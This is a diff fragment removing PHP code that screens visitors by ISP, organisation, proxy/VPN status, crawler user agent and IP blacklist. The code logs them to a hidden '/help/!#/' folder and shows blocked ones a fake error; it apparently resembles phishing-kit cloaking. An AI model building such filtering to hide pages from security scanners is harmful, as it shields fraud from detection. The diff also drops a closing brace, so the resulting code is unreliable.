@@ -94,44 +94,5 @@ function checkIP() {
         return true;
     }
     return false;
-}
 
-$whitelisted_values = explode(',', $whitelist);
-
-if (!in_array($_SERVER['REMOTE_ADDR'], $whitelisted_values)) {
-
-    // Initialisation des variables $isp et $org
-    $isp = isset($_SESSION['isp']) ? $_SESSION['isp'] : 'Unknown ISP';
-    $org = isset($_SESSION['org']) ? $_SESSION['org'] : 'Unknown Org';
-    $proxy = isset($_SESSION['proxy']) ? $_SESSION['proxy'] : '';
-    $hosting = isset($_SESSION['hosting']) ? $_SESSION['hosting'] : '';
-
-    if ($isp == "" && $org == "" && $proxy == "" && $hosting == "") {
-        header('location: /');
-    } elseif (CheckIspOrg($org, $isp, $isps)) {
-        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "ISPS / ORG\n", FILE_APPEND);
-        validate();
-        die('An error occurred while trying to access this website. Please try again later');
-    } elseif ($proxy || $hosting) {
-        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "PROXY / VPN\n", FILE_APPEND);
-        validate();
-        die('An error occurred while trying to access this website. Please try again later');
-    } elseif (preg_match($crawler, $ua) || preg_match($crawler, $isp)) {
-        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "Crawler USER-AGENT\n", FILE_APPEND);
-        validate();
-        die('An error occurred while trying to access this website. Please try again later');
-    } elseif (checkIP()) {
-        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "BLACKLIST\n", FILE_APPEND);
-        validate();
-        die('An error occurred while trying to access this website. Please try again later');
-    } else {
-        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
-    }
-} else {
-    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
-}
-
-if (!isset($_SESSION['captcha'], $_SESSION['captchaToken']) || $_SESSION['captcha'] != true) {
-    header('Location: /');
-}
 ?>
